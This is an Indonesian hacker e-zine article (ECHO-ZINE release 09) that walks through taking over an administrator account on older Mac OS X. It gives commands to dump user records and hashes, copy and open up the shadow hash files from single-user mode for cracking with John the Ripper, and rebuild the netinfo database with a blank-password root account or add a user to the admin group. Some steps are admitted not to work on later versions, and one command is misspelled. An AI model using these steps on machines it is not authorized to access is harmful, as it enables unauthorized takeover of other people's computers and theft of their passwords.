@@ -1,0 +1,117 @@
+    
+  
+        ____________________   ___ ___ ________   
+       --\_   _____/\_   ___ \ /   |   \\_____  \--
+	 -|    __)_ /    \  \//    ~    \/   |   \--
+	 -|        \\     \___\    Y    /    |    \--
+	-/_______  / \______  /\___|_  /\_______  /-
+	 -      -\/        -\/      -\/        -\/- 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE 09
+
+Author: AgD || saddam.husein@gmail.com || AgD@telkom.net
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+.:: Crack Admin Password (Mac OS x) ::. 
+
+Untuk meng-crackpassword langkah pertama adalah mendapatkan hash. Run terminal and type:
+
+G4x:~ noadmin$ nidump passwd . 
+	-- anda akan melihat admin username diikuti tanda : ********  
+	   ex: root:********:0:0::0:0:System Administrator:/var/root:/bin/sh
+	       admin:********:503:503::0:0:agd:/Users/admin:/bin/bash
+	       agd:********:503:503::0:0:agd:/Users/agd:/bin/bash
+
+G4x:~ noadmin$ niutil -read . /users/admin --> untuk membaca profil dari admin dan akan 			
+-- dihasilkan generateduid : F8EE9D97-4E66-11D9-AFFE-000A95C81955 --> make note about this	   
+
+misalkan untuk melihat profil dari user agd:
+--------------------------------------------------
+G4x:~ noadmin$ niutil -read . /users/agd
+name: agd
+_writers_passwd: agd
+_writers_tim_password: agd
+_writers_picture: agd
+shell: /bin/bash
+_writers_hint: agd
+home: /Users/agd
+gid: 503
+authentication_authority: ;ShadowHash;
+_writers_realname: agd
+picture: /Library/User Pictures/Animals/Dog.tif
+passwd: ********
+realname: agd
+hint: 
+sharedDir: Public
+_shadow_passwd: 
+uid: 503
+generateduid: F8EE9D97-4E66-11D9-AFFE-000A95C81944
+---------------------------------------------------	
+
+kemudian untuk meng-generate kedalam file text lakukan perintah berikut:
+
+--------------------------------------------------
+G4x:~ noadmin$ nireport / /users agd generateduid > crck.txt
+
+reboot, masuk melalui single-user mode (hold Cmd+S). dan ketikan perintah ini:
+
+mount -uaw
+cp -R /var/db/shadow/hash /Users/hash
+chmod -Rf 777 /Users/hash
+reboot
+
+perintah diatas untuk memindahkan file hash ke directory /Users/hash.
+Setelah mendapatkan hash, download john the ripper di http://www.openwall.com/john/
+
+Cara untuk menggunakan JTR tidak akan dibahas disini karena sudah banyak sekali 
+tutorial-tutorial yang bertebaran di inet tentang JTR ini.
+
+-----------------------------------------------------------------------------------------------------
+Jika anda tetap tidak mendapatkan akses untuk melakukan perintah2 diatas, maka anda dapat sama sekali 
+menghapus file database netinfo dan menggantinya dengan yang baru sehingga yang dapat masuk kedalam 
+komputer hanya user yg anda ciptakan.
+-----------------------------------------------------------------------------------------------------
+
+hanya dengan melakukan perintah ini:
+-----------------------------------------------------------------------------------------------------
+reboot ke single user mode, secara default anda akan mempunyai akses root.
+
+localhost:/ root# /sbin/mount -uw /
+localhost:/ root# cd /var/db/netinfo
+localhost:/var/db/netinfo root# mv local.nidb local.nidb.old  --->tujuannya untuk menonaktifkan netinfo 								  sebelumnya, dan mengganti dg yg baru
+localhost:/var/db/netinfo root# /usr/libexec/create_nidb      --->netinfo baru!
+localhost:/var/db/netinfo root# nicl -raw local.nidb -create /users/root passwd "" -->enable root 
+sehingga anda bisa mengakses komputer dalam mode gui dengan account root (password blank) dan membuat 
+account baru (admin) sesuka anda
+
+localhost:/var/db/netinfo root# exit
+
+-----------------------------------------------------------------------------------------------------
+
+atau jika anda tidak ingin mereset keseluruhan database netinfo gunakan perintah ini pada single-user:
+-----------------------------------------------------------------------------------------------------
+localhost:/ root# /sbin/fsck -y
+localhost:/ root# /sbin/mount -wu
+localhost:/ root# /sbin/SystemStarter
+localhost:/ root# niuitil -appendprop / /groups/admin users USER
+localhost:/ root# sudo reboot
+-----------------------------------------------------------------------------------------------------
+
+Maaf ternyata cara diatas tidak berhasil, karena saya menggunakan tehnik ini pada OS 10.2 (it's work!) 
+dan mungkin tidak berhasil pada OS 10.3
+
+Dan jika terdapat kesalahan mohon dikoreksi untuk menghasilkan tulisan yang jauh lebih baik :P
+
+
+	REFERENSI : http://freaky.staticusers.net
+	            http://www.openwall.com/john/ 
+
+
+*GREETZ TO:  	Apple G4, Mr. Steve Jobs, [M4'is]--> kamana wae mank??, [Bono the CaT]
+		[Ono], Echo|Staff (yg mau memuat tulisan ini, thank's bro!) Echo|Memberz, Barudak 	
+		newbie_hacker dan semua portal Hacking dan open source di indonesia
+
+	
+	kirimkan kritik && saran ke saddam.husein@gmail.com || AgD@telkom.net
